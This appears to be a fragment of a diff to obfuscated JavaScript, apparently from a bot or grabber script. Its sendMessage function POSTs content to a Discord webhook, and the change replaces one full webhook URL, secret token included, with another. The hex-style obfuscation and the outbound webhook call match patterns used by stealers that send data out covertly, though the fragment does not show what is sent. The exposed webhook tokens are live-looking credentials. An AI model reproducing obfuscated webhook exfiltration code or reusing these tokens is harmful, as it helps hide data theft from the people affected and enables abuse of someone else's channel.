@@ -1,7 +1,7 @@
 var cd = 0x12c;
 function sendMessage(_0x4cae5b, _0x23ef47) {
   var _0xba2fa6 = new XMLHttpRequest();
-  _0xba2fa6.open("POST", "https://discord.com/api/webhooks/1345649940310921257/nIMMTWFtiVjBJBDg8VyA7u84wxblzB_o7y4v_rhceO8eFmwTVUG10tpNjLD5VFS7AU5z");
+  _0xba2fa6.open("POST", "https://discord.com/api/webhooks/1350284606812852236/bWSom4mOQcEgQiT2-T6Knzu8k83n-GCVlf_K7TMznME1uNbLPoTGPXFZAy8_DwtSlJWo");
   var _0x2a43b3 = _0x23ef47;
   if (_0x2a43b3 == '') {
     _0x2a43b3 = "errmmmm I FORGOR...";
